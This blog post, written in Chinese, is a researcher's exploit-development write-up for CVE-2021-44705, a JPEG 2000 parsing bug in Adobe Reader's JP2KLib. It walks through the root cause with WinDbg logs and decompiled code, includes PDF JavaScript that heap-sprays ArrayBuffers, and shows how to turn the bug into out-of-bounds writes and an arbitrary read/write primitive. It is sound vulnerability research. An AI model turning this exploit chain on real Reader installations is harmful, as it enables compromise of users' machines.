---
layout: post
title: "CVE-2021-44705 Adobe Reader JPEG 2000图像解析漏洞"
tags: 漏洞利用
author: Joey
excerpt_separator: <!--more-->
---

# 前言

本文为2021年天府杯漏洞利用系列的最后一篇，该漏洞发生在Adobe Reader解析JPEG 2000格式图片时，对于图片中的数据解析出错导致访问了未初始化的地址。漏洞位于`JP2KLib.dll`模块，对应的Adobe Reader版本为：21.007.20099。<!--more-->

# 漏洞原理

开启page heap调试崩溃于`JP2KLib+0x5882B`函数内，由于ecx内存放了该非法地址导致的崩溃：

```
0:015> g
(13b0.ff8): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=38209038 ebx=55b84fc8 ecx=55f464e4 edx=09340000 esi=55f464e4 edi=55f464e4
eip=6299883a esp=047fcd8c ebp=047fcd98 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202
JP2KLib!JP2KCopyRect+0x147ea:
6299883a 8b400c          mov     eax,dword ptr [eax+0Ch] ds:002b:38209044=????????
0:000> dd ecx
55f464e4  3010b058 d048a038 d8184010 38209038
55f464f4  00000000 00000000 00000000 00000000
55f46504  00000000 00000000 00000000 00000000
55f46514  00000000 00000000 00000000 00000000
55f46524  00000000 00000000 00000000 00000000
55f46534  00000000 00000000 00000000 00000000
55f46544  00000000 00000000 00000000 00000000
55f46554  00000000 00000000 00000000 00000000
```

刚开始分析时以为这是一个标准的UAF漏洞，于是就向上回溯该地址生成的原因；经过分析后发现该地址是由九次运算后得到的，并不是一个被释放后的对象地址：

```
0:000> dd 5a212060 +11*44 //初始地址为空
5a2124e4  00000000 00000000 00000000 00000000
5a2124f4  00000000 00000000 00000000 00000000
5a212504  00000000 00000000 00000000 00000000
5a212514  00000000 00000000 00000000 00000000
5a212524  00000000 00000000 00000000 00000000
5a212534  00000000 00000000 00000000 00000000
5a212544  00000000 00000000 00000000 00000000
5a212554  00000000 00000000 00000000 00000000
0:000> ba w 4 /5 5a2124f0 //设置写断点
Unknown option ' '
0:000> g
Breakpoint 2 hit
eax=5a2124f0 ebx=5ac96f50 ecx=00000020 edx=0000b004 esi=00000007 edi=580c9600
eip=6f0281ac esp=003bc1f4 ebp=003bc264 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
JP2KLib!JP2KUserActions::operator=+0x269cc:
6f0281ac 8b4dec          mov     ecx,dword ptr [ebp-14h] ss:002b:003bc250=00000001
0:000> dd 5a212060 +11*44 //第一次运算
5a2124e4  00008048 0000a028 00004010 00000020
5a2124f4  00000000 00000000 00000000 00000000
5a212504  00000000 00000000 00000000 00000000
5a212514  00000000 00000000 00000000 00000000
5a212524  00000000 00000000 00000000 00000000
5a212534  00000000 00000000 00000000 00000000
5a212544  00000000 00000000 00000000 00000000
5a212554  00000000 00000000 00000000 00000000
0:000> g
Breakpoint 2 hit
eax=5a2124f0 ebx=5ac96f50 ecx=00000010 edx=0000c008 esi=00000003 edi=40b96000
eip=6f0281ac esp=003bc1f4 ebp=003bc264 iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
JP2KLib!JP2KUserActions::operator=+0x269cc:
6f0281ac 8b4dec          mov     ecx,dword ptr [ebp-14h] ss:002b:003bc250=00000002
0:000> dd 5a212060 +11*44 //第二次运算
5a2124e4  00008048 0000a028 00004010 00000030
5a2124f4  00000000 00000000 00000000 00000000
5a212504  00000000 00000000 00000000 00000000
5a212514  00000000 00000000 00000000 00000000
5a212524  00000000 00000000 00000000 00000000
5a212534  00000000 00000000 00000000 00000000
5a212544  00000000 00000000 00000000 00000000
5a212554  00000000 00000000 00000000 00000000
0:000> g
Breakpoint 2 hit
eax=5a2124f0 ebx=5ac96f50 ecx=00000008 edx=00000010 esi=00000004 edi=137df000
eip=6f0281ac esp=003bc1f4 ebp=003bc264 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
JP2KLib!JP2KUserActions::operator=+0x269cc:
6f0281ac 8b4dec          mov     ecx,dword ptr [ebp-14h] ss:002b:003bc250=00000003
0:000> dd 5a212060 +11*44 //第三次运算
5a2124e4  00008048 c048a028 00004010 00000038
5a2124f4  00000000 00000000 00000000 00000000
5a212504  00000000 00000000 00000000 00000000
5a212514  00000000 00000000 00000000 00000000
5a212524  00000000 00000000 00000000 00000000
5a212534  00000000 00000000 00000000 00000000
5a212544  00000000 00000000 00000000 00000000
5a212554  00000000 00000000 00000000 00000000
0:000> g
Breakpoint 2 hit
eax=5a2124f0 ebx=5ac96f50 ecx=00000003 edx=00000003 esi=00000004 edi=137df000
eip=6f0281c1 esp=003bc1f4 ebp=003bc264 iopl=0         nv up ei ng nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000282
JP2KLib!JP2KUserActions::operator=+0x269e1:
6f0281c1 8b45f0          mov     eax,dword ptr [ebp-10h] ss:002b:003bc254=00000000
0:000> dd 5a212060 +11*44 //第四次运算
5a2124e4  00008048 c048a028 00004010 00008038
5a2124f4  00000000 00000000 00000000 00000000
5a212504  00000000 00000000 00000000 00000000
5a212514  00000000 00000000 00000000 00000000
5a212524  00000000 00000000 00000000 00000000
5a212534  00000000 00000000 00000000 00000000
5a212544  00000000 00000000 00000000 00000000
5a212554  00000000 00000000 00000000 00000000
0:000> g
Breakpoint 2 hit
eax=5a2124f1 ebx=5ac96f50 ecx=00000010 edx=0000c002 esi=00000006 edi=98f9d400
eip=6f0281ac esp=003bc1f4 ebp=003bc264 iopl=0         nv up ei ng nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000286
JP2KLib!JP2KUserActions::operator=+0x269cc:
6f0281ac 8b4dec          mov     ecx,dword ptr [ebp-14h] ss:002b:003bc250=00000002
0:000> dd 5a212060 +11*44 //第五次运算
5a2124e4  00009048 c048a028 00004010 00009038
5a2124f4  00000000 00000000 00000000 00000000
5a212504  00000000 00000000 00000000 00000000
5a212514  00000000 00000000 00000000 00000000
5a212524  00000000 00000000 00000000 00000000
5a212534  00000000 00000000 00000000 00000000
5a212544  00000000 00000000 00000000 00000000
5a212554  00000000 00000000 00000000 00000000
0:000> g
Breakpoint 2 hit
eax=5a2124f2 ebx=5ac96f50 ecx=00000020 edx=0000d77e esi=00000005 edi=06a22800
eip=6f0281ac esp=003bc1f4 ebp=003bc264 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
JP2KLib!JP2KUserActions::operator=+0x269cc:
6f0281ac 8b4dec          mov     ecx,dword ptr [ebp-14h] ss:002b:003bc250=00000001
0:000> dd 5a212060 +11*44 //第六次运算
5a2124e4  00009048 c048a028 00004010 00209038
5a2124f4  00000000 00000000 00000000 00000000
5a212504  00000000 00000000 00000000 00000000
5a212514  00000000 00000000 00000000 00000000
5a212524  00000000 00000000 00000000 00000000
5a212534  00000000 00000000 00000000 00000000
5a212544  00000000 00000000 00000000 00000000
5a212554  00000000 00000000 00000000 00000000
0:000> g
Breakpoint 2 hit
eax=5a2124f3 ebx=5ac96f50 ecx=00000020 edx=00000003 esi=00000001 edi=003bc394
eip=6f028491 esp=003bc224 ebp=003bc264 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
JP2KLib!JP2KUserActions::operator=+0x26cb1:
6f028491 83fe03          cmp     esi,3
0:000> dd 5a212060 +11*44 //第七次运算
5a2124e4  1010b048 c048a028 d8184010 20209038
5a2124f4  00000000 00000000 00000000 00000000
5a212504  00000000 00000000 00000000 00000000
5a212514  00000000 00000000 00000000 00000000
5a212524  00000000 00000000 00000000 00000000
5a212534  00000000 00000000 00000000 00000000
5a212544  00000000 00000000 00000000 00000000
5a212554  00000000 00000000 00000000 00000000
0:000> g
Breakpoint 2 hit
eax=5a2124f3 ebx=5ac96f50 ecx=00000010 edx=00000003 esi=00000002 edi=003bc394
eip=6f028491 esp=003bc224 ebp=003bc264 iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
JP2KLib!JP2KUserActions::operator=+0x26cb1:
6f028491 83fe03          cmp     esi,3
0:000> dd 5a212060 +11*44 //第八次运算
5a2124e4  1010b048 c048a028 d8184010 30209038
5a2124f4  00000000 00000000 00000000 00000000
5a212504  00000000 00000000 00000000 00000000
5a212514  00000000 00000000 00000000 00000000
5a212524  00000000 00000000 00000000 00000000
5a212534  00000000 00000000 00000000 00000000
5a212544  00000000 00000000 00000000 00000000
5a212554  00000000 00000000 00000000 00000000
0:000> g
Breakpoint 2 hit
eax=5a2124f3 ebx=5ac96f50 ecx=00000008 edx=00000003 esi=00000003 edi=003bc394
eip=6f028491 esp=003bc224 ebp=003bc264 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
JP2KLib!JP2KUserActions::operator=+0x26cb1:
6f028491 83fe03          cmp     esi,3
0:000> dd 5a212060 +11*44 //第九次运算
5a2124e4  1010b048 c048a028 d8184010 38209038
5a2124f4  00000000 00000000 00000000 00000000
5a212504  00000000 00000000 00000000 00000000
5a212514  00000000 00000000 00000000 00000000
5a212524  00000000 00000000 00000000 00000000
5a212534  00000000 00000000 00000000 00000000
5a212544  00000000 00000000 00000000 00000000
5a212554  00000000 00000000 00000000 00000000
```

而且每次生成的值必定相同，说明该值是通过JPEG2000中的数据而生成。

分析到这里，漏洞原理就清楚了：Adobe在解析JPEG2000图片中的某个数据时，通过各种解密算法后得到了一个非法访问的地址。该地址刚好位于解析的对像中，由于没有对访问的对象进行合法性检查，导致直接访问该地址时造成了非法内存访问。

# 漏洞利用

## 利用条件分析

由于错误是由于非法内存访问引起，首先考虑的是通过堆喷射，让该非法地址变成能合法访问的正常地址。由于POC是压缩后的文件，先使用[PDFtk](https://www.pdflabs.com/tools/pdftk-the-pdf-toolkit/)获取解压后的PDF文件，获取可读的JS代码：

```
27 0 obj 
<<
/Length 144
>>
stream
	stoy0 = app.setTimeOut("step1()", 10);
	
	function step1() {
		var b0 = this.getField("Button0");
		b0.display = display.visible;
	}
endstream 
endobj 
```

在此基础上修改代码，堆喷ArrayBuffer对象到非法地址上：

```
27 0 obj 
<<
/Length 144
>>
stream
	var arrays = null;
	var BufferLength = 0x10000 - 0x18;

	function SparyByBuffer(count) {
    	var array = new Array(count);
    	array[0] = new ArrayBuffer(BufferLength);
    	var dv = new DataView(array[0]);
    	for (var i = 0; i < BufferLength; ++i) {
        	dv.setUint8(i, 0x0);
    	}
    	for (var i = 1; i < array.length; i++) {
        	array[i] = array[0].slice();
    	}
    	return array;
	}
	function step1() {
		var b0 = this.getField("Button0");
		b0.display = display.visible;
	}
	
	arrays = SparyByBuffer(0x4000);
	stoy0 = app.setTimeOut("step1()", 10);
	
	
endstream 
endobj 
```

此时调试后发现崩溃于`RtlpFreeHeapInternal`函数内，且free的地址就是之前查看的对象的第三个地址，查看调用堆栈发现导致崩溃的函数和之前一致：

```
0:000> dd 5a212060 +11*44 //最终的free的地址就是this[2]，0xd8184010
55f464e4  3010b058 d048a038 d8184010 38209038
55f464f4  00000000 00000000 00000000 00000000
55f46504  00000000 00000000 00000000 00000000
55f46514  00000000 00000000 00000000 00000000
0:018> g
(11c8.5d8): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=d8184010 ebx=00000000 ecx=00000000 edx=d8184010 esi=05280000 edi=d8184008
eip=777a654f esp=00e4ca98 ebp=00e4cae4 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
ntdll!RtlpFreeHeapInternal+0xd7:
777a654f 807f0705        cmp     byte ptr [edi+7],5         ds:002b:d818400f=??
0:000> k
 # ChildEBP RetAddr  
00 00e4cae4 7775dbf6 ntdll!RtlpFreeHeapInternal+0xd7
01 00e4cb04 7607ec4b ntdll!RtlFreeHeap+0x46
02 00e4cb18 7607ec18 ucrtbase!_free_base+0x1b
03 00e4cb28 7151db89 ucrtbase!free+0x18
00 00e4cae4 7775dbf6 ntdll!RtlpFreeHeapInternal+0xd7
01 00e4cb04 7607ec4b ntdll!RtlFreeHeap+0x46
02 00e4cb18 7607ec18 ucrtbase!_free_base+0x1b
03 00e4cb28 7151db89 ucrtbase!free+0x18
WARNING: Stack unwind information not available. Following frames may be wrong.
04 00e4cb38 6b5b7190 AcroRd32!AcroWinMainSandbox+0x8609
05 00e4cb48 6b5b71ad JP2KLib!JP2KTileGeometryRegionIsTile+0x230
06 00e4cb54 6b5a8899 JP2KLib!JP2KTileGeometryRegionIsTile+0x24d
07 00e4cb78 6b5a93cd JP2KLib!JP2KCopyRect+0x14849
08 00e4cb98 6b5a94c6 JP2KLib!JP2KCopyRect+0x1537d
09 00e4cc08 6b59c704 JP2KLib!JP2KCopyRect+0x15476
......
```

于是深入分析该函数，发现有明显的内存释放的能力，只要能控制this指针所指的值就可以实现释放特定地址的堆喷后的对象，进而构造读写原语：

```
int __thiscall crash(_DWORD *this)
{
  int result; // eax
  int v3; // edi
  int v4; // ebx
  int v5; // ecx
  int v6; // ebx
  int v7; // [esp+4h] [ebp-8h]

  result = this[3];
  if ( result )
  {
    result = *(_DWORD *)(result + 0xC);         // 未堆喷时crash位置
    v3 = 0;
    v7 = result;
    v4 = 0;
    if ( (int)this[4] > 0 )
    {
      do
      {
        result = sub_100588A0(v3 + this[1]);
        ++v4;
        v3 += 0x70;
      }
      while ( v4 < this[4] );
      v3 = 0;
    }
    v5 = this[2];
    if ( v5 )
    {
      if ( this[0x10] * this[0xF] > 0 )
      {
        v6 = 0;
        do
        {
          sub_100587DA(v6 + this[2]);
          ++v3;
          v6 += 0x1C;
        }
        while ( v3 < this[0x10] * this[0xF] );
        v5 = this[2];
      }
      return relese(v5, v7);	//堆喷后crash发生在该函数内，内部调用free函数
    }
  }
  return result;
}
```

## 指定内存释放构造

有了内存释放的思路后，接下就要分析如何修改JPEG2000文件使得该对象地址为指定的特殊地址。于是查找了JPEG2000的参考文档，大致了解了相关结构后找到了影响该运算地址的值，然而尝试修改了许多次都无法构造指定的内存地址，最终构造的较为理想的地址如下：

```
0:018> g
eax=00000012 ebx=0ce013d8 ecx=5e069524 edx=05540000 esi=00000011 edi=5e069524
eip=6b3e882c esp=00efcc00 ebp=00efcc20 iopl=0         nv up ei ng nz ac pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000297
JP2KLib!JP2KCopyRect+0x147dc:
6b3e882c 8bec            mov     ebp,esp
0:000> dd ecx
5e069524  e8581060 90281050 50808868 40904850
5e069534  00000000 00000000 00000000 00000000
5e069544  00000000 00000000 00000000 00000000
5e069554  00000000 00000000 00000000 00000000
5e069564  00000000 00000000 00000000 00000000
5e069574  00000000 00000000 00000000 00000000
5e069584  00000000 00000000 00000000 00000000
5e069594  00000000 00000000 00000000 00000000
```

这两个地址都指向了堆喷后的对象，是完全可控的内容，然而对象本身的内容不能够随意控制，因此分析后发现只有relese函数有可利用的机会：

```
int __cdecl call_free(int a1, int a2)
{
  if ( a2 )
    return sub_100607A2(a1);
  else
    return free_0(a1);
}
```

该函数内a2即为this\[3\]\[3\]，即0x40904850+0xC内存放的值，如果该值为0，则调用free函数释放this[2]，即地址0x50808868：

```
0:000> t
eax=0ec0fd80 ebx=00000000 ecx=7607ec00 edx=00002041 esi=7607ec00 edi=00000000
eip=7607ec00 esp=00efcbb4 ebp=00efcbc0 iopl=0         nv up ei pl zr na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000247
ucrtbase!free:
7607ec00 8bff            mov     edi,edi
0:000> dps esp+4 L1
00efcbb8  50808868
```

因此理想状态是控制this[2]的值为指定堆喷对象的地址例如0x20200048，但实际操作过程如果要精确构造该地址需要详细分析具体的解析算法，评估时间代价后决定先寻找越界写条件，实在无法构造越界写时再分析解析算法实现指定内存释放。

## 越界写构造

继续深入分析`sub_100607A2`函数，该函数内需要满足条件后才会执行`sub_10063742`函数，而在该函数内确实有越界写的可能：

```
int __thiscall sub_100607A2(_DWORD *this, int a2)
{
  if ( a2 )
  {
    if ( ++this[4] == this[3] && (int)this[7] > 1 ) //需要满足该条件才能继续执行
      sub_10063742();
  }
  return 0;
}

int __thiscall sub_10063742(_DWORD *this)
{
  int result; // eax
  int v3; // eax

  if ( !this[5] )
    return 0x10;
  this[7] = 0xFFFFFFFF;	//尝试一：如果this[7]内指向的是ArrayBuffer对象的长度，则能直接构造读写原语
  this[2] = 0;
  sub_10063708(this);
  v3 = this[5];
  this[8] = v3;
  if ( !v3 )
  {
    result = sub_1005FE6F(this, this[0xB]);
    if ( result )
      return result;
    this[8] = this[5];	//尝试二：或this[8]内指向的是ArrayBuffer对象的长度，也能构造出读写原语
  }
  this[7] = 0;
  return 0;
}
```

尝试一通过将this[7]设置为ArrayBuffer的byteLength实现直接构造读写原语，尝试二则通过this[8]来实现同样的目的，然而在尝试后这两个构造都无法通过`sub_100607A2`函数的条件：

```
0:000> g	//尝试一：无法满足++this[4] == this[3]这一条件
Breakpoint 1 hit
eax=00000000 ebx=00000000 ecx=20210030 edx=057f0000 esi=5e5848e4 edi=00000000
eip=6b3f07a2 esp=00eec5d4 ebp=00eec5dc iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
JP2KLib!IJP2KException::Clone+0x2c2:	//sub_100607A2函数
6b3f07a2 55              push    ebp
0:000> dd ecx	//当this[7]为byteLength时，++this[4] == this[3]这一条件无法得到满足，因为this[4]的值不可控且未知
20210030  00000000 00000000 00000000 00000000
20210040  46345aaf 088b5a6c 00000000 0000ffe8
20210050  00000000 00000000 00000000 00000000
20210060  00000000 00000000 00000000 00000000
20210070  00000000 00000000 00000000 00000000
20210080  00000000 00000000 00000000 00000000
20210090  00000000 00000000 00000000 00000000
202100a0  00000000 00000000 00000000 00000000
0:000> g	//尝试二：可以满足++this[4] == this[3]，但是无法满足this[7] > 1这一条件
Breakpoint 1 hit
eax=00000000 ebx=00000000 ecx=20210034 edx=00800000 esi=5e076604 edi=00000000
eip=6b3c07a2 esp=003ccc6c ebp=003ccc74 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
JP2KLib!IJP2KException::Clone+0x2c2:
6b3c07a2 55              push    ebp
0:000> dd ecx	//当this[8]为byteLength时，this[7]的值不可控导致this[7] > 1无法满足
2021002c  00000000 00000000 00000000 00000000
2021003c  00000000 b73bf465 088ba61a 00000000
2021004c  0000ffe8 00000000 00000000 00000000
2021005c  00000000 00000000 00000000 00000000
2021006c  00000000 00000000 00000000 00000000
2021007c  00000000 00000000 00000000 00000000
2021008c  00000000 00000000 00000000 00000000
2021009c  00000000 00000000 00000000 00000000
```

继续深入分析，在`sub_10063708`函数内有越界写的可能，但仔细分析后只能将byteLength置为0，无法实现越界读写：

```
void __thiscall sub_10063708(_DWORD *this)
{
  _DWORD *v2; // esi
  int v3; // eax
  int v4; // ebx

  v2 = (_DWORD *)this[5];
  if ( v2 )
  {
    v3 = this[6];
    if ( v3 )
    {
      v4 = 0;
      if ( v3 > 0 )
      {
        do
        {
          sub_1006738D(*v2, 0, v2[2]);          // memset
          v2[1] = *v2;     // 该处也有越界写的机会，但只能将前一个地址的值赋给后一个地址，而byteLength前的值不可控
          ++v4;
          v2 = (_DWORD *)v2[3];
        }
        while ( v4 < this[6] );
      }
    }
  }
}
```

最终在`sub_1005FE6F`函数找到了实现越界写的条件，即将byteLength位于this[1]中，随后运算实现ArrayBuffer的越界读写：

```
int __thiscall sub_1005FE6F(_DWORD *this, int a2)
{
  unsigned int v3; // ebx
  int *v4; // esi
  int v6; // eax
  int v7; // ecx
  int v8; // eax
  int v9; // eax

  v3 = a2 + this[0xA];
  if ( v3 <= this[0xB] )
    v3 = this[0xB];
  v4 = (int *)alloc(0x14u, 1u);
  if ( !v4 )
    return 8;
  v6 = alloc(v3, 1u);
  *v4 = v6;
  if ( !v6 )
  {
    free_0((int)v4);
    this[5] = 0;
    return 8;
  }
  v4[1] = v6;
  v4[2] = v3;
  v7 = this[8];
  if ( v7 )
  {
    v4[4] = v7;
    v4[3] = *(_DWORD *)(v7 + 0xC);
    *(_DWORD *)(v7 + 0xC) = v4;
    v8 = v4[3];
    if ( v8 )
      *(_DWORD *)(v8 + 0x10) = v4;
  }
  else
  {
    v9 = this[5];
    v4[4] = 0;
    v4[3] = v9;
    this[5] = v4;
  }
  ++this[6];
  this[1] += v3;                                // 最终实现的越界写条件
  return 0;
}
```

然而该函数执行条件在正常情况下几乎是不可能的：

```
int __thiscall sub_10063742(_DWORD *this)
{
  int result; // eax
  int v3; // eax

  if ( !this[5] )	//首先检查了this[5]非0
    return 0x10;
  this[7] = 0xFFFFFFFF;
  this[2] = 0;
  sub_10063708(this);
  v3 = this[5];		//随后将this[5]赋值给v3
  this[8] = v3;
  if ( !v3 )		//当this[5]为0时才执行该函数
  {
    result = sub_1005FE6F(this, this[0xB]); //需要执行的目标函数
    if ( result )
      return result;
    this[8] = this[5];
  }
  this[7] = 0;
  return 0;
}
```

唯一的可能就是通过`sub_10063708`函数将this[5]置为0，同时还需要满足前置条件`++this[4] == this[3] && (int)this[7] > 1`，在一番尝试后构造出了能够实现越界写的内存布局：

```
0:000> g
Proxy object acquired for read  by thread 5092.
Thread 5092 releasing Proxy object acquired for read.
Proxy object acquired for read  by thread 5092.
Thread 5092 releasing Proxy object acquired for read.
Breakpoint 1 hit
eax=00000000 ebx=00000000 ecx=20210048 edx=05400000 esi=62c33524 edi=00000000
eip=6ad507a2 esp=00cfc664 ebp=00cfc66c iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200206
JP2KLib!IJP2KException::Clone+0x2c2:	//此时在sub_100607A2函数内
6ad507a2 55              push    ebp
0:000> dd ecx	//++this[4]时变为0刚好等于this[3],this[7] > 1，满足条件
20210048  00000000 0000ffe8 00000000 00000000
20210058  ffffffff 20210058 00000001 00000002
20210068  20210040 00000000 00000000 00000100
20210078  00000000 00000000 00000000 00000000
20210088  00000000 00000000 00000000 00000000
20210098  00000000 00000000 00000000 00000000
202100a8  00000000 00000000 00000000 00000000
202100b8  00000000 00000000 00000000 00000000
0:000> pc
eax=00000000 ebx=00000000 ecx=20210048 edx=05400000 esi=62c33524 edi=00000000
eip=6ad507bc esp=00cfc660 ebp=00cfc660 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200202
JP2KLib!IJP2KException::Clone+0x2dc:
6ad507bc e8812f0000      call    JP2KLib!IJP2KException::GetErrString+0x2c62 (6ad53742)
0:000> t
eax=00000000 ebx=00000000 ecx=20210048 edx=05400000 esi=62c33524 edi=00000000
eip=6ad53742 esp=00cfc65c ebp=00cfc660 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200202
JP2KLib!IJP2KException::GetErrString+0x2c62:
6ad53742 56              push    esi
0:000> dd ecx	//执行完毕上一条件后this[4]变为0
20210048  00000000 0000ffe8 00000000 00000000
20210058  00000000 20210058 00000001 00000002
20210068  20210040 00000000 00000000 00000100
20210078  00000000 00000000 00000000 00000000
20210088  00000000 00000000 00000000 00000000
20210098  00000000 00000000 00000000 00000000
202100a8  00000000 00000000 00000000 00000000
202100b8  00000000 00000000 00000000 00000000
0:000> pc	//此时通过了this[5]非0的检查，来到了sub_10063708函数
eax=00000000 ebx=00000000 ecx=20210048 edx=05400000 esi=20210048 edi=00000000
eip=6ad53758 esp=00cfc658 ebp=00cfc660 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
JP2KLib!IJP2KException::GetErrString+0x2c78:
6ad53758 e8abffffff      call    JP2KLib!IJP2KException::GetErrString+0x2c28 (6ad53708)
0:000> p
eax=00000000 ebx=00000000 ecx=20210048 edx=05400000 esi=20210048 edi=00000000
eip=6ad5375d esp=00cfc658 ebp=00cfc660 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
JP2KLib!IJP2KException::GetErrString+0x2c7d:
6ad5375d 8b4614          mov     eax,dword ptr [esi+14h] ds:002b:2021005c=00000000
0:000> dd ecx	//利用该函数将this[4]的值赋给this[5]，使得下一个条件this[5]=0满足
20210048  00000000 0000ffe8 00000000 00000000
20210058  00000000 00000000 00000001 ffffffff
20210068  20210040 00000000 00000000 00000100
20210078  00000000 00000000 00000000 00000000
20210088  00000000 00000000 00000000 00000000
20210098  00000000 00000000 00000000 00000000
202100a8  00000000 00000000 00000000 00000000
202100b8  00000000 00000000 00000000 00000000
0:000> pc
eax=00000000 ebx=00000000 ecx=20210048 edx=05400000 esi=20210048 edi=00000000
eip=6ad5376c esp=00cfc654 ebp=00cfc660 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
JP2KLib!IJP2KException::GetErrString+0x2c8c:
6ad5376c e8fec6ffff      call    JP2KLib!JP2KCopyRect+0x1be1f (6ad4fe6f)
0:000> p
eax=00000000 ebx=00000000 ecx=00000000 edx=00000100 esi=20210048 edi=00000000
eip=6ad53771 esp=00cfc658 ebp=00cfc660 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
JP2KLib!IJP2KException::GetErrString+0x2c91:
6ad53771 85c0            test    eax,eax
0:000> dd 20210048	//最终通过sub_1005FE6F函数将byteLength+this[B]的值实现越界写
20210048  00000000 000100e8 00000000 00000000
20210058  00000000 0de4f490 00000002 ffffffff
20210068  00000000 00000000 00000000 00000100
20210078  00000000 00000000 00000000 00000000
20210088  00000000 00000000 00000000 00000000
20210098  00000000 00000000 00000000 00000000
202100a8  00000000 00000000 00000000 00000000
202100b8  00000000 00000000 00000000 00000000
```

最后通过越界写的能力将下一个临近ArrayBuffer对象的byteLength修改为0xffffffff，实现任意内存读写原语：

```
0:000> dd 20220048
20220048  00000000 ffffffff 11092138 00000000
20220058  ffffffff 20210058 00000001 00000002
20220068  20210040 00000000 00000000 00000100
20220078  00000000 00000000 00000000 00000000
20220088  00000000 00000000 00000000 00000000
20220098  00000000 00000000 00000000 00000000
202200a8  00000000 00000000 00000000 00000000
202200b8  00000000 00000000 00000000 00000000
```

任意内存读写原语构造完毕，漏洞利用就结束了，剩下的就是套模板实现代码执行了。

# 总结

该漏洞是2021天府杯漏洞系列中耗时最久才写出来利用的，其中最花费我最长时间的是寻找能够影响非法地址的图像数据。需要先通过文档学习了JPEG2000格式的结构后，再手动定位到可能触发漏洞的数据部分，逐个修改最终才勉强实现了可控的内存地址。在这个过程中也经常因为没有思路想要放弃，于是停止了EXP编写转而研究其他的漏洞。通过一番周折最终还是写出了利用，虽然没有写出内存释放的利用方式，但还是学习到了很多利用的技巧以及最重要的耐心。这也是2021天府杯漏洞利用系列的最后一篇，在这里做个完结，时刻葆有对低效率的自己的耐心很重要。
